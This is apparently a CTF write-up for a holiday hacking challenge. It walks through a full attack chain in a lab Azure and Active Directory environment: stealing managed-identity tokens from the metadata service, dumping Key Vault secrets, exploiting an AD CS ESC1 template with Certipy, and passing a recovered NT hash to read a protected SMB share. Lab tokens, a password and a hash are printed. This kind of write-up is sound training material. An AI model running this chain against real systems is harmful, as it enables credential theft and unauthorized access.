# active-directory :christmas_tree::christmas_tree::christmas_tree::christmas_tree:
## Objective
Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

## Conversations

Ribb Bonbowford

Initial conversation:

- Hello, I'm Ribb Bonbowford. Nice to meet you!
- Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.
- Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.
- I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.
- I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.
- Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.

## Hints
- Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.
- It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.

## Useful AI Prompts

- How can I get a token for Azure API from an Azure Linux virtual machine?
- Give me a short tutorial on using impacket

## Approach
To gain an understanding of the AD environment, I'll use the Azure Linux machine to interact with the [Azure Instance Metadata Service API](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux) to get the and then use that token in PowerShell to interact with the API.

```console
curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

What's returned is a json object containing several properties for the environment, but notably I will use the Subscription ID and Resource Group ID.

This now allows me to begin additional api calls now that I know the Subscription and Resource Group I have.  In order to hit standard APIs, I will need to generate a token.  To do so, I can actually get a token from the same endpoint in the Azure Instance Metadata Service because this machine is authenticated to the Azure service:

```console
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
```

This will return a json object with the access token:

```json
{"access_token":"eyJ0eXAi...","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"85901","expires_on":"1702429034","ext_expires_in":"86399","not_before":"1702342334","resource":"https://management.azure.com/","token_type":"Bearer"}
```

Now that I have a token, I can go to any machine and interact with the API using that token for the subscription that hosts the Azure Linux VM. For me, this is easiest in PowerShell.

```powershell
$accessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNDUwNDgsIm5iZiI6MTcwMjM0NTA0OCwiZXhwIjoxNzAyNDMxNzQ4LCJhaW8iOiJFMlZnWUlneTR1cTBkUTVXL2ZKNmhWYjNrMU45QUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJOSHBIUUIwUk1FU21fU1lDMG1vZEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.Hh319ysX0csHSJput76alAa3uKjlkaStQHaQbo8-KDfS60QNZXrtqreIc51ys0RlgF-SUKVB6YCwwxDeQbpcSeX6Q1eTq5fxsvkL9CuIM71Cm_q5dQG_RFv7hkW0PQqRLlydxM3Q5wasvFmt-9Vvw-2glyxAFGJ21F9d-FhNUXhBKWFcmlHRNYlxQZg_02v8TF9-wzBIndK6RN_fQVG1ynm4T23KKpgqxfjkgvLo1uSRZeLRhiI5OY6lE77W6hviH9PkGA3GrNj9WXlBEdBC1zXTch8__j7_D9ddMsD5jUYx-10HV5vcJMNvierj5o_JKtpwA9PyFqCodYfBxALOBA'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01"

$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content | ConvertFrom-Json
Write-Output $content.value

# found some vaults so find what I can get from them
$vaults = @(
    "northpole-it-kv"
    "northpole-ssh-certs-kv"
    )

$types = @(
    'keys'
    'secrets'
    'certificates'
    'storage'
    )

$uriPrefix = "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers"

$content = @()
$secretUris = @()

foreach ($vault in $vaults) {
    foreach ($type in $types) {
        $uri = "$uriPrefix/Microsoft.KeyVault/vaults/$($vault)/$($type)?api-version=2022-07-01"
        try {
            $result = Invoke-WebRequest -Uri $uri -Headers $headers
            Write-Output "[Success] Access to $vault $type" 
            $content += $result.content | ConvertFrom-Json
            $secretUris += $content.value.properties.secretUriWithVersion
        }
        catch {
            Write-Output "[Failure] No access to $vault $type"
        }
    }
}

$secretUris = $secretUris | Sort-Object -Unique
Write-Output $secretUris

# I found some secrets so I'm going to attempt to gain access to them

#get key vault access token on linux:
# curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true

$keyVaultAccessToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIzNDk1NjgsIm5iZiI6MTcwMjM0OTU2OCwiZXhwIjoxNzAyNDM2MjY4LCJhaW8iOiJFMlZnWUxqNC90T3l6OWRlQ0szTmExQ1BuakN6Q1FBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsIm9pZCI6IjYwMGEzYmM4LTdlMmMtNDRlNS04YTI3LTE4YzNlYjk2MzA2MCIsInJoIjoiMC5BRkVBMm82amtBWkExVTJTVEd5bFhLekJUVG16cU0taWdocEhvOGtQd0w1NlFKUFFBQUEuIiwic3ViIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwidGlkIjoiOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkIiwidXRpIjoiRWdESk1vZzVmRUNlaXptNjZqb2lBQSIsInZlciI6IjEuMCIsInhtc19hel9yaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL3NzaC1zZXJ2ZXItdm0iLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy8yYjA5NDJmMy05YmNhLTQ4NGItYTUwOC1hYmRhZTJkYjVlNjQvcmVzb3VyY2Vncm91cHMvbm9ydGhwb2xlLXJnMS9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL25vcnRocG9sZS1zc2gtc2VydmVyLWlkZW50aXR5In0.Zo7FCorGBiX6Mv3DhJhHGkCa1Oc4ElyMHq_93D9MtCHFMc8MrQwmdEIEtzqpqHjn4LSJPTbxWp7P90NmW20chxWMS9MTGzaHOjpUOnuDoRfESci_yERS5vh0Z1QtvXcfwggJ6li-ifPdiPM3ktTZyBo1gzvmQma3wc8a-3zfUzuYj551Ez6KMXN5ieRAeaFT6yUN1iPoXKFe9QcN2ucjke_X_RwQCIKjjfQKL46jmkm2UqxhWMqHRz1g81AWcROwDQi1nKxEwb4QNmx6k6CqR5agTAbfq89-bESx4xfdIiFbTU9M0qWd96IzmYjFhv-R_kV-aTuKd3u5JhEA9cwWEA'

$vaultHeaders = @{
"Authorization" = "Bearer $keyVaultAccessToken"
"Content-Type" = "application/json"
}

$content = @()

foreach ($secretUri in $secretUris) {
    try {
        $result = Invoke-WebRequest -Uri "$($secretUri)?api-version=7.4" -Headers $vaultHeaders
        $content += $result.content | ConvertFrom-Json
        Write-Output "[Success] Access to $secretUri"
    }
    catch {
        Write-Output "[Failure] No access to $secretUri"
    }
}

Write-Output $content.value
```

Found this in vault:

```powershell
Import-Module ActiveDirectory;
$UserName = "elfy";
$UserDomain = "northpole.local";
$UserUPN = "$UserName@$UserDomain"
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
$DCIP = "10.0.0.53";
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

Spun my wheels on this for a bit, as I didn't really know now what my attack vector would be. But I decided to go back to the Linux terminal as alabaster and poke around. Something I didn't even notice when I first logged in as Alabaster (oh, and I missed the hint SMH) is there is a folder in his home directory called Impacket. There are multiple tools there so began trying them out.

```console
alabaster@ssh-server-vm:~$ pwd
/home/alabaster
alabaster@ssh-server-vm:~$ ls
alabaster_todo.md  impacket
alabaster@ssh-server-vm:~$ cd impacket
alabaster@ssh-server-vm:~/impacket$ ls
DumpNTLMInfo.py     atexec.py        exchanger.py       goldenPac.py      mimikatz.py       nmapAnswerMachine.py  raiseChild.py     rpcmap.py       smbexec.py    split.py            wmiquery.py
Get-GPPPassword.py  certipy          findDelegation.py  karmaSMB.py       mqtt_check.py     ntfs-read.py          rbcd.py           sambaPipe.py    smbpasswd.py  ticketConverter.py
GetADUsers.py       changepasswd.py  getArch.py         keylistattack.py  mssqlclient.py    ntlmrelayx.py         rdp_check.py      samrdump.py     smbrelayx.py  ticketer.py
GetNPUsers.py       dcomexec.py      getPac.py          kintercept.py     mssqlinstance.py  ping.py               reg.py            secretsdump.py  smbserver.py  tstool.py
GetUserSPNs.py      dpapi.py         getST.py           lookupsid.py      net.py            ping6.py              registry-read.py  services.py     sniff.py      wmiexec.py
addcomputer.py      esentutl.py      getTGT.py          machine_role.py   netview.py        psexec.py             rpcdump.py        smbclient.py    sniffer.py    wmipersist.py
alabaster@ssh-server-vm:~/impacket$ python3 GetADUsers.py -all northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying 10.0.0.53 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
alabaster                                             2023-12-12 02:03:10.009431  2023-12-12 15:15:02.771100
Guest                                                 <never>              <never>
krbtgt                                                2023-12-12 02:11:42.348154  <never>
elfy                                                  2023-12-12 02:13:45.650140  2023-12-12 15:52:41.904053
wombleycube                                           2023-12-12 02:13:45.759558  2023-12-12 16:46:44.924070
alabaster@ssh-server-vm:~/impacket$
```

Some additional recon:

```console
alabaster@ssh-server-vm:~/impacket$ python3 DumpNTLMInfo.py 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

[+] SMBv1 Enabled   : False
[+] Prefered Dialect: SMB 3.0
[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
[+] Max Read Size   : 8.0 MB (8388608 bytes)
[+] Max Write Size  : 8.0 MB (8388608 bytes)
[+] Current Time    : 2023-12-12 17:17:49.242742+00:00
[+] Name            : npdc01
[+] Domain          : NORTHPOLE
[+] DNS Tree Name   : northpole.local
[+] DNS Domain Name : northpole.local
[+] DNS Host Name   : npdc01.northpole.local
[+] OS              : Windows NT 10.0 Build 20348
[+] Null Session    : False
alabaster@ssh-server-vm:~/impacket$
```

Looking for SMB shares:
```console
alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py northpole.local/elfy:'J4`ufC49/J4766'@10.0.0.53 -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
# cd super_secret_research
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# 
```

There we are.  We have the share now, but can't access it with user elfy. On a side note, I have a lot of great cookie recipes after going through the trouble (and by trouble, I mean scp didn't work so convert the pdfs to base64 and copy the large amount of text then convert back to pdf on my machine) of transfering those pdfs thinking they may contain something useful. That was a rabbit hole. Knowing this is all about AD CS, I look a bit into the impacket tool [Github:Certipy](https://github.com/ly4k/Certipy). First, I use the tool to check the for templates using the AD username and password found earlier:

```console
alabaster@ssh-server-vm:~/impacket$certipy find -u elfy@northpole.local -p 'J4`ufC49/J4766' -dc-ip 10.0.0.53
```

This outputs some files, and looking at the xxxx_Certipy.txt file I see there is one misconvigured certificate template vulnerable to the [ESC1 vulnerability](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

```
  0
    Template Name                       : NorthPoleUsers
    Display Name                        : NorthPoleUsers
    Certificate Authorities             : northpole-npdc01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Domain Users
                                          NORTHPOLE.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
                                          NORTHPOLE.LOCAL\Enterprise Admins
    [!] Vulnerabilities
      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

To exploit this vulnerability, I first request a certificate using that template as Domain User elfy but requesting SAN as wombleycube@<nolink>northpole.local:

```console
alabaster@ssh-server-vm:~/impacket$ certipy req -username elfy@northpole.local -password 'J4`ufC49/J4766' -ca northpole-npdc01-CA -target 10.0.0.53 -template NorthPoleUsers -upn wombleycube@northpole.local -ns 10.0.0.53 -dns npdc01.northpole.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 100
[*] Got certificate with multiple identifications
    UPN: 'wombleycube@northpole.local'
    DNS Host Name: 'npdc01.northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube_npdc01.pfx'
alabaster@ssh-server-vm:~/impacket$
```

Next, I attempt to get a hash I can use to access the fileshare:

```console
alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'wombleycube@northpole.local'
    [1] DNS Host Name: 'npdc01.northpole.local'
> 0
[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
alabaster@ssh-server-vm:~/impacket$ 
```

YES! I now have a hash I can use.  Let's put it to work going back to the SMB share:

```console
alabaster@ssh-server-vm:~/impacket$ python3 smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 ..
-rw-rw-rw-        231  Wed Dec 13 01:20:33 2023 InstructionsForEnteringSatelliteGroundStation.txt
```

WIN! I now have my secret file name we need to enter into the objective to complete the challenge: InstructionsForEnteringSatelliteGroundStation.txt

But, why stop there?  What's in the secret file, potentially something useful??

```
# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.


# 
```

Well, that IS useful!

## Resources
[AD CS Exploit Background](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

[Video explaining exploit](https://www.youtube.com/watch?v=HBRCI5O35R8)

[Github:Impacket](https://github.com/fortra/impacket)

[Github:Certipy](https://github.com/ly4k/Certipy)

[Github:Certipy for Windows](https://github.com/GhostPack/Certify)

[Azure Instance Metadata Service API](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux)
